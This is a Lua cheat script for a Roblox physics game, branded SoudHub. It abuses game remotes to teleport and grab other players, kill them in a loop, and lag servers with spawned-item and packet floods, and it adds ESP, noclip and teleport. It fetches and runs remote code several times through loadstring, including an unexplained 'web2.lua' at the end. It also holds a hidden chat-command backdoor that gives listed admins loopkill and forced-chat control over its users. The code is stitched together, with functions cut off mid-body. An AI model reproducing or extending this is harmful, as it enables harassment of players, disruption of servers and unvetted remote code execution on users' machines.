local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/SoudHub/SoudHub-/refs/heads/main/Orion/Orion%20by%20Bliz_T"))()

        if currentInspectS == 1 then
            local player = game.Players:FindFirstChild(currentInspectedAdorneeS.Name)
            if player then
                -- Show both names: username and display name
                textlabelC1.Text = "Username: " .. player.Name
                textlabelC2.Text = "Display: " .. player.DisplayName
            else
                textlabelC1.Text = currentInspectedAdorneeS.Name
                textlabelC2.Text = ""
            end
        else
            textlabelC1.Text = currentInspectedAdorneeS.Name
            textlabelC2.Text = ""
        end
    elseif not inspectInfoT and inspectInfoOnT or not inspectT and inspectInfoOnT then
        inspectInfoOnT = false
        if billboardInstance then
            billboardInstance:Destroy()
            billboardInstance = nil
        end
    end
end

local function inspectBringF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if inspectT and currentInspectS ~= 2 and currentInspectS ~= 4 then
        returnPosS = hrp.CFrame
        hrp.CFrame = currentInspectedAdorneeS.PrimaryPart.CFrame + Vector3.new(7, 3, 0)
        task.wait(0.15)
        
        if currentInspectS == 1 then
            local humanoidRootPart = currentInspectedAdorneeS:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                pcall(function()
                    rs.GrabEvents.SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                end)
                task.wait(0.1)
                humanoidRootPart.CFrame = returnPosS
            end
        else
            local primaryPart = currentInspectedAdorneeS.PrimaryPart
            if primaryPart then
                pcall(function()
                    rs.GrabEvents.SetNetworkOwner:FireServer(primaryPart, primaryPart.CFrame)
                end)
                task.wait(0.1)
                primaryPart.CFrame = returnPosS
            end
        end
        hrp.CFrame = returnPosS
    elseif not inspectT then
        if mouse.Target and mouse.Target.Parent then
            if mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or 
               (mouse.Target.Parent.Parent and string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys")) or 
               (mouse.Target.Parent.Parent and mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform")) or 
               mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
                returnPosS = hrp.CFrame
                local mouseTargetS = mouse.Target
                hrp.CFrame = mouseTargetS.Parent.PrimaryPart.CFrame + Vector3.new(10, 3, 0)
                task.wait(0.15)
                
                if mouseTargetS.Parent:FindFirstChildOfClass("Humanoid") then
                    local humanoidRootPart = mouseTargetS.Parent:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                        end)
                        task.wait(0.1)
                        humanoidRootPart.CFrame = returnPosS
                    end
                else
                    local primaryPart = mouseTargetS.Parent.PrimaryPart
                    if primaryPart then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(primaryPart, primaryPart.CFrame)
                        end)
                        task.wait(0.1)
                        primaryPart.CFrame = returnPosS
                    end
                end
                hrp.CFrame = returnPosS
            end
        end
    end
end

-- ANTI-EXPLODE FUNCTION --
local function antiExplodeF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "Part" and char ~= nil and antiExplodeT then
            local mag = (model.Position - hrp.Position).Magnitude
            if mag <= 20 then
                hrp.Anchored = true
                task.wait(0.01)
                local rightArm = char:FindFirstChild("Right Arm")
                if rightArm and rightArm:FindFirstChild("RagdollLimbPart") then
                    while rightArm.RagdollLimbPart.CanCollide == true do task.wait(0.001) end
                end
                hrp.Anchored = false
            end
        end
    end)
end

-- ANTI-GRAB FUNCTIONS --
local function antiGrabF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    while antiGrabT and task.wait() do
        if plr:FindFirstChild("IsHeld") and plr.IsHeld.Value == true and antiGrabT == true then
            if hrp ~= nil then
                if antiGrabAnchorT then
                    hrp.Anchored = true
                    while plr.IsHeld.Value == true do 
                        pcall(function()
                            rs.CharacterEvents.Struggle:FireServer(plr)
                        end)
                        task.wait(0.001) 
                    end
                    hrp.Anchored = false
                elseif not antiGrabAnchorT then
                    while plr.IsHeld.Value == true do 
                        pcall(function()
                            rs.CharacterEvents.Struggle:FireServer(plr)
                        end)
                        task.wait(0.001) 
                    end
                end
            end
        end
    end
end

local function antiBlobF()
    workspace.DescendantAdded:Connect(function(toy)
        if toy.Name == "CreatureBlobman" and toy.Parent ~= inv and antiBlobT then
            task.wait()
            local leftDetector = toy:FindFirstChild("LeftDetector")
            local rightDetector = toy:FindFirstChild("RightDetector")
            if leftDetector then leftDetector:Destroy() end
            if rightDetector then rightDetector:Destroy() end
        end
    end)
end

-- Functions needed for Auto Gucci
local function updateCurrentHouseF()
    local char = plr.Character
    if not char then return end
    
    if char.Parent == workspace then
        currentHouseS = 0
    elseif char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            local owners = plot.PlotSign and plot.PlotSign:FindFirstChild("ThisPlotsOwners")
            if owners then
                for _, owner in owners:GetChildren() do
                    if owner.Value == plr.Name then
                        currentHouseS = tonumber(plot.Name:match("%d+")) or 0
                        return
                    end
                end
            end
        end
    end
end

local function getBlobmanF()
    local char = plr.Character
    if not char then return end
    
    updateCurrentHouseF()
    if currentHouseS == 0 then
        if inv then return inv:FindFirstChild("CreatureBlobman") end
        return nil
    else
        local plot = workspace.PlotItems:FindFirstChild("Plot"..currentHouseS)
        if plot then
            return plot:FindFirstChild("CreatureBlobman")
        end
        return nil
    end
end

local function spawnBlobmanF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    if spawnRemote then
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame*CFrame.new(0,0,-5), Vector3.new(0, -15.716, 0))
        end)
        task.wait(1)
        blobmanInstanceS = getBlobmanF()
    end
end

local function destroyBlobmanF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if blobmanInstanceS and destroyAutoGucciT then
        if currentHouseS == 0 then
            local args = {[1] = blobmanInstanceS}
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then 
                pcall(function()
                    destroyRemote:FireServer(unpack(args))
                end)
            end
            blobmanInstanceS = nil
        else
            local plot = workspace.Plots:FindFirstChild("Plot"..currentHouseS)
            if plot and plot:FindFirstChild("TeslaCoil") then
                local zapPart = plot.TeslaCoil:FindFirstChild("ZapPart")
                if zapPart then
                    blobmanInstanceS.HumanoidRootPart.CFrame = zapPart.CFrame
                end
            end
            blobmanInstanceS = nil
        end
    end
end

local function ragdollLoopF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    if ragdollLoopD then return end
    ragdollLoopD = true
    
    while sitJumpT do
        if char and hrp then
            local args = {[1] = hrp, [2] = 0}
            pcall(function()
                rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
            end)
        end
        task.wait()
    end
    
    ragdollLoopD = false
end

local function sitJumpF()
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    local startTime = tick()
    while autoGucciT and tick()-startTime < 6 do
        if blobmanInstanceS then
            local seat = blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
            if seat and seat.Occupant ~= hum then 
                seat:Sit(hum) 
            end
        end
        task.wait(0.1)
        if char and hum then 
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        task.wait(0.1)
    end
    
    if blobmanInstanceS then 
        destroyBlobmanF() 
    end
    autoGucciT = false
    sitJumpT = false
end
--fov
local function changeFOV(value)
    _G.CurrentFOV = value
    local camera = workspace.CurrentCamera
    if camera then
        camera.FieldOfView = value
    end
end

-- BLOBMAN SYSTEM FUNCTIONS FROM PROVIDED SCRIPT
local function isDescendantOf(target, other)
    local currentParent = target.Parent
    while currentParent do
        if currentParent == other then
            return true
        end
        currentParent = currentParent.Parent
    end
    return false
end

local function DestroyT(toy)
    local toy = toy or inv:FindFirstChildWhichIsA("Model")
    rs.MenuToys.DestroyToy:FireServer(toy)
end

local function blobGrabPlayer(player, blobman)
    if blobalter == 1 then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("LeftDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("LeftDetector"):FindFirstChild("LeftWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 2
        end
    else
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local args = {
                [1] = blobman:FindFirstChild("RightDetector"),
                [2] = player.Character:FindFirstChild("HumanoidRootPart"),
                [3] = blobman:FindFirstChild("RightDetector"):FindFirstChild("RightWeld")
            }
            blobman:WaitForChild("BlobmanSeatAndOwnerScript"):WaitForChild("CreatureGrab"):FireServer(unpack(args))
            blobalter = 1
        end
    end
end

local function reloadMissile(bool)
    if bool then
        if not reloadBombCoroutine then
            reloadBombCoroutine = coroutine.create(function()
                connectionBombReload = inv.ChildAdded:Connect(function(child)
                    if child.Name == _G.ToyToLoad and child:WaitForChild("ThisToysNumber", 1) then
                        if child.ThisToysNumber.Value == (inv.ToyNumber.Value - 1) then
                            local connection2
                            connection2 = inv.ChildRemoved:Connect(function(child2)
                                if child2 == child then
                                    connection2:Disconnect()
                                end
                            end)

                            rs.GrabEvents.SetNetworkOwner:FireServer(child.Body, child.Body.CFrame)
                            local waiting = child.Body:WaitForChild("PartOwner", 0.5)
                            local connection = child.DescendantAdded:Connect(function(descendant)
                                if descendant.Name == "PartOwner" then
                                    if descendant.Value ~= plr.Name then
                                        DestroyT(child)
                                        connection:Disconnect()
                                    end
                                end
                            end)
                            game:GetService("Debris"):AddItem(connection, 60)
                            if waiting and waiting.Value == plr.Name then
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.CanCollide = false
                                    end
                                end
                                child:SetPrimaryPartCFrame(CFrame.new(-72.9304581, -3.96906614, -265.543732))
                                task.wait(0.2)
                                for _, v in pairs(child:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Anchored = true
                                    end
                                end
                                table.insert(bombList, child)
                                child.AncestryChanged:Connect(function()
                                    if not child.Parent then
                                        for i, bomb in ipairs(bombList) do
                                            if bomb == child then
                                                table.remove(bombList, i)
                                                break
                                            end
                                        end
                                    end
                                end)
                                connection2:Disconnect()
                            else
                                DestroyT(child)
                            end
                        end
                    end
                end)

                while true do
                    if plr:FindFirstChild("CanSpawnToy") and plr.CanSpawnToy.Value and #bombList < _G.MaxMissiles and plr.Character:FindFirstChild("Head") then
                        local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
                        spawnRemote:InvokeServer(_G.ToyToLoad, plr.Character.Head.CFrame or plr.Character.HumanoidRootPart.CFrame, Vector3.new(0, 0, 0))
                    end
                    task.wait()
                end
            end)
            coroutine.resume(reloadBombCoroutine)
        end
    else
        if reloadBombCoroutine then
            coroutine.close(reloadBombCoroutine)
            reloadBombCoroutine = nil
        end
        if connectionBombReload then
            connectionBombReload:Disconnect()
        end
    end
end

-- FUNCTIONS FOR PLAYER SELECTION
local function getPlayers()
    local players = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= plr then
            table.insert(players, player.Name)
        end
    end
    return players
end

local function teleportToPlayer(player)
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local targetChar = player.Character
    if not targetChar then return end
    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return end
    
    hrp.CFrame = targetHrp.CFrame
end

-- FUNCTIONS FOR BLOBMAN TAB
local function blobmanFarmF()
    while blobmanAutoFarm and task.wait(blobmanFarmSpeed) do
        spawnBlobmanF()
        task.wait(0.5)
        
        if blobmanInstanceS then
            -- Make Blobman follow you
            local char = plr.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local humanoid = blobmanInstanceS:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:MoveTo(char.HumanoidRootPart.Position)
                end
            end
            
            task.wait(3)
            destroyBlobmanF()
        end
    end
end

-- Lag Functions
function lagF()
    local char = plr.Character
    if not char then return end
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    
    for i, e in ipairs(game.Players:GetPlayers()) do
        if table.find(Whitelist, e.Name) then
            return
        end
    end
    
    while task.wait(1) and lagT do
        for a = 0, linesV do
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Torso") then
                    rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
                end
            end
        end
    end
end

function pingF()
    for i, e in ipairs(game.Players:GetPlayers()) do
        if table.find(Whitelist, e.Name) then
            return
        end
    end
    
    local char = plr.Character
    if not char then return end
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    
    while task.wait() and pingT do
        rs.GrabEvents.ExtendGrabLine:FireServer(string.rep("Balls Balls Balls Balls", packetsV))
    end
end

function shurikenLagServerF()
    while shurikenLagServerT do
        pcall(function()
            for i = 1, 10 do
                rs.MenuToys.SpawnToyRemoteFunction:InvokeServer("Shuriken", CFrame.new(0, 0, 0), Vector3.new(0, 0, 0))
            end
        end)
        task.wait(0.1)
    end
end

-- Configure teleport system initially
teleportConnection = setupTeleportKeybind()

-- Configure infinite jump
setupInfiniteJump()

--CMDS
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

--admins no topo
--[] = false
-- Tabela para controlar loops ativos
local activeLoops = {}

-- Função para encontrar um jogador pelo nome
local function findPlayer(targetName)
    if not targetName or targetName == "" then
        return nil
    end
    
    targetName = targetName:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower():sub(1, #targetName) == targetName then
            return player
        end
    end
    return nil
end

-- Função para iniciar loop de morte
local function startKillLoop(player)
    activeLoops[player.UserId] = true
    
    -- Usa corrotina para loop infinito
    task.spawn(function()
        while activeLoops[player.UserId] do
            if player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid and humanoid.Health > 0 then
                    humanoid.Health = 0
                end
            end
            task.wait(2) -- Espera 2 segundos entre cada morte
        end
    end)
end

-- Função para parar loop de morte
local function stopKillLoop(player)
    activeLoops[player.UserId] = nil
end

-- Escuta quando um jogador envia uma mensagem
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        -- Verifica se a mensagem veio de um administrador
        if ADMIN_LIST[player.UserId] then
            local loweredMsg = message:lower()
            
            -- Comando :reveal
            if loweredMsg == ":reveal all" then
                TextChatService.TextChannels.RBXGeneral:SendAsync("Im use SoudHub")
            
            -- Comando :loopkill [nome]
            elseif loweredMsg:sub(1, 9) == ":loopkill" then
                local targetName = string.sub(message, 11) -- Pega o nome após ":loopkill "
                local targetPlayer = findPlayer(targetName)
                
                if targetPlayer then
                    startKillLoop(targetPlayer)
                    print(player.Name .. " ativou loopkill em " .. targetPlayer.Name)
                else
                    print("Jogador não encontrado: " .. tostring(targetName))
                end
            
            -- Comando :unloopkill [nome]
            elseif loweredMsg:sub(1, 11) == ":unloopkill" then
                local targetName = string.sub(message, 13) -- Pega o nome após ":unloopkill "
                local targetPlayer = findPlayer(targetName)
                
                if targetPlayer then
                    stopKillLoop(targetPlayer)
                    print(player.Name .. " desativou loopkill em " .. targetPlayer.Name)
                else
                    print("Jogador não encontrado: " .. tostring(targetName))
                end
            
            -- Comando :chat [mensagem]
            elseif loweredMsg:sub(1, 6) == ":chat " then
                local chatMessage = string.sub(message, 7) -- Pega a mensagem após ":chat "
                TextChatService.TextChannels.RBXGeneral:SendAsync(chatMessage)
            
            -- Comando :kill [nome] (original)
            elseif loweredMsg:sub(1, 6) == ":kill " then
                local targetName = string.sub(message, 7) -- Pega o nome após ":kill "
                local targetPlayer = findPlayer(targetName)
                
    end
})

-- NoClip
PlayersTab:AddToggle({
    Name = "NoClip",
    Default = false,
    Callback = function(Value)
        noClipT = Value
        if Value then
            updateNoClipF()
            print("on")
        else
            print("off")
        end
    end
})

-- Jump Power
PlayersTab:AddSlider({
    Name = "Jump Power",
    Min = 50,
    Max = 550,
    Default = 50,
    Color = Color3.fromRGB(193, 18, 31),
    Increment = 1,
    ValueName = "JumpPower",
    Callback = function(Value)
        jumpPowerV = Value
        if infJumpT then
            updateJumpPowerF()
        end
    end
})

-- Lines Tab
--[[local GrabTab = Window:MakeTab({
    Name = "Lines",
    Icon = "rbxassetid://97889814027474",
    PremiumOnly = false
})--]]


-- Main Tab
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://124620632231839",
    PremiumOnly = false
})

-- Keybind selector for teleport
MainTab:AddDropdown({
    Name = "Teleport Keybind",
    Default = "Z",
    Options = {"Z", "Q", "R", "F", "G", "T"},
    Callback = function(Value)
        teleportKeybind = Enum.KeyCode[Value]
        OrionLib:MakeNotification({
            Name = "Keybind Changed",
            Content = "Teleport key changed to: " .. Value,
            Time = 3
            })
    end
})

-- Normal teleport button (alternative)
MainTab:AddButton({
    Name = "Teleport (Single Click)",
    Callback = function()
        local char = plr.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        local mouse = plr:GetMouse()
        if mouse.Target then 
            hrp.CFrame = CFrame.new(mouse.Hit.X, mouse.Hit.Y + 5, mouse.Hit.Z)
        end
    end
})

MainTab:AddSection({
    Name = "Config FOV"
})

-- Add slider para Fov
MainTab:AddSlider({
    Name = "FOV",
    Min = 30,
    Max = 120,
    Default = 70,
    Color = Color3.fromRGB(193, 18, 31),
    Increment = 1,
    ValueName = "FOV",
    Callback = function(value)
        changeFOV(value)
    end
})

MainTab:AddButton({
    Name = "Reset FOV",
    Callback = function()
        print("fov reseted")
        changeFOV(70)
        for _, element in pairs(MainTab.Elements) do
            if element.Name == "FOV" then
                element:Set(70)
                break
            end
        end
    end
})

MainTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        print("Infinite yield Loaded")
        OrionLib:MakeNotification({
            Name = "Infinite Yield",
            Content = "Infinite Yield Loaded (Destroyed GUI)",
            Image = "rbxassetid://9327507243",
            Time = 3
        })
        task.wait(1)
        OrionLib:Destroy()
    end
})

-- Bliz script
MainTab:AddButton({
    Name = "Bliz_T Script",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/refs/heads/main/FTAP.lua"))()
    end
})

MainTab:AddButton({
    Name = "Close UI",
    Callback = function()
        OrionLib:Destroy()
    end
})

MainTab:AddButton({
    Name = "More Info",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "More Info",
            Content = "Disable All options to avoid bugs"
        })
    end
})

--[[MainTab:AddSection({
    Name = "Lag Controls"
})

MainTab:AddToggle({
    Name = "Activate Lag",
    Default = false,
    Callback = function(Value)
        lagT = Value
        if Value then
            coroutine.wrap(lagF)()
            OrionLib:MakeNotification({
                Name = "Lag Activated",
                Content = "Lag system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Lag Deactivated",
                Content = "Lag system deactivated",
                Time = 3
            })
        end
    end
})

MainTab:AddSlider({
    Name = "Number of Lines",
    Min = 1,
    Max = 50,
    Default = 10,
    Color = Color3.fromRGB(20, 35, 248, 1),
    Increment = 1,
    ValueName = "lines",
    Callback = function(Value)
        linesV = Value
    end
})

MainTab:AddToggle({
    Name = "Activate Ping",
    Default = false,
    Callback = function(Value)
        pingT = Value
        if Value then
            coroutine.wrap(pingF)()
            OrionLib:MakeNotification({
                Name = "Ping Activated",
                Content = "Ping system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Ping Deactivated",
                Content = "Ping system deactivated",
                Time = 3
            })
        end
    end
})

MainTab:AddSlider({
    Name = "Number of Packets",
    Min = 10,
    Max = 500,
    Default = 100,
    Color = Color3.fromRGB(20, 35, 248, 1),
    Increment = 10,
    ValueName = "packets",
    Callback = function(Value)
        packetsV = Value
    end
})

MainTab:AddToggle({
    Name = "Shuriken Lag Server",
    Default = false,
    Callback = function(Value)
        shurikenLagServerT = Value
        if Value then
            coroutine.wrap(shurikenLagServerF)()
            OrionLib:MakeNotification({
                Name = "Shuriken Lag Activated",
                Content = "Shuriken lag system activated",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Shuriken Lag Deactivated",
                Content = "Shuriken lag system deactivated",
                Time = 3
            })
        end
    end
})--]]


-- Inspection Tab
local InspectTab = Window:MakeTab({
    Name = "Inspect/Bring",
    Icon = "rbxassetid://6523858394",
    PremiumOnly = false
})

InspectTab:AddSection({
    Name = "ESP"
})

-- Variável para controlar o estado do ESP
local ESPAtivo = false
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MaxDistance = 10000 -- Distância máxima em studs para o ESP aparecer :cite[3]

-- Função para criar o ESP para um jogador
local function criarESP(jogador)
    if jogador == LocalPlayer then return end -- Não cria ESP para o próprio jogador :cite[3]

    local function adicionarInterface(personagem)
        if not personagem or not ESPAtivo then return end

        local cabeca = personagem:WaitForChild("Head")
        
        -- Remove ESP anterior se existir
        local espAntigo = cabeca:FindFirstChild("ESP_" .. jogador.Name)
        if espAntigo then
            espAntigo:Destroy()
        end

        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "ESP_" .. jogador.Name
        billboardGui.Adornee = cabeca
        billboardGui.Size = UDim2.new(0, 75, 0, 150) -- Usa Offset para tamanho fixo :cite[3]
        billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = cabeca

        -- Imagem do jogador
        local imagem = Instance.new("ImageLabel")
        imagem.Name = "Avatar"
        imagem.Size = UDim2.new(1, 0, 0.5, 0)
        imagem.Position = UDim2.new(0, 0, 0, 0)
        imagem.BackgroundTransparency = 1
        imagem.BorderSizePixel = 0
        imagem.AnchorPoint = Vector2.new(0.5, 0)
        imagem.Parent = billboardGui

        -- Carrega a imagem de perfil
        local sucesso, urlDaImagem = pcall(function()
            return Players:GetUserThumbnailAsync(
                jogador.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
            )
        end)
        
        if sucesso then
            imagem.Image = urlDaImagem
        else
            imagem.Image = "rbxassetid://0"
        end

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(0.5, 0)
avatarCorner.Parent = imagem

-- Cria a borda roxa
local border = Instance.new("UIStroke")
border.Parent = imagem
border.Color = Color3.fromRGB(162, 79, 205) -- Um exemplo de roxo. Altere o RGB para a cor que preferir.
border.Thickness = 2 -- Define a espessura da borda
border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border -- Garante que o traço envolva o objeto

        -- Nome de usuário (USERNAME)
        local usernameLabel = Instance.new("TextLabel")
        usernameLabel.Name = "Username"
        usernameLabel.Size = UDim2.new(1, 0, 0.25, 0)
        usernameLabel.Position = UDim2.new(0, 0, 0.5, 0)
        usernameLabel.BackgroundTransparency = 1
        usernameLabel.Text = jogador.Name
        usernameLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
        usernameLabel.TextScaled = true
        usernameLabel.Font = Enum.Font.GothamBold
        usernameLabel.AnchorPoint = Vector2.new(0.5, 0)
        usernameLabel.Parent = billboardGui

        -- Nome de exibição (@display)
        local displayNameLabel = Instance.new("TextLabel")
        displayNameLabel.Name = "DisplayName"
        displayNameLabel.Size = UDim2.new(1, 0, 0.25, 0)
        displayNameLabel.Position = UDim2.new(0, 0, 0.75, 0)
        displayNameLabel.BackgroundTransparency = 1
        displayNameLabel.Text = "@" .. jogador.DisplayName
        displayNameLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
        displayNameLabel.TextScaled = true
        displayNameLabel.Font = Enum.Font.Gotham
        displayNameLabel.AnchorPoint = Vector2.new(0.5, 0)
        displayNameLabel.Parent = billboardGui

        -- Função para atualizar visibilidade baseada na distância :cite[3]
        local function atualizarVisibilidade()
            if ESPAtivo and jogador.Character and jogador.Character:FindFirstChild("Head") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
                local distancia = (jogador.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
                billboardGui.Enabled = (distancia <= MaxDistance)
            else
                billboardGui.Enabled = false
            end
        end

        -- Monitora a visibilidade em tempo de execução :cite[3]
        local conexao
        conexao = RunService.Heartbeat:Connect(function()
            if jogador.Character and jogador.Character:FindFirstChild("Head") then
                atualizarVisibilidade()
            else
                if billboardGui.Parent then
                    billboardGui:Destroy()
                end
                conexao:Disconnect()
            end
        end)
    end

    -- Conecta a função quando o personagem spawnar
    if jogador.Character then
        task.defer(adicionarInterface, jogador.Character) -- Usa task.defer para evitar waits bloqueantes
    end
    jogador.CharacterAdded:Connect(adicionarInterface)
end

-- Função para remover o ESP de um jogador
local function removerESP(jogador)
    if jogador.Character and jogador.Character:FindFirstChild("Head") then
        local cabeca = jogador.Character.Head
        local esp = cabeca:FindFirstChild("ESP_" .. jogador.Name)
changeFOV(70)

-- Initialize
OrionLib:Init()

------------web
loadstring(game:HttpGet("https://raw.githubusercontent.com/SoudHub/web/refs/heads/main/web2.lua"))()
-----------------------------------------------
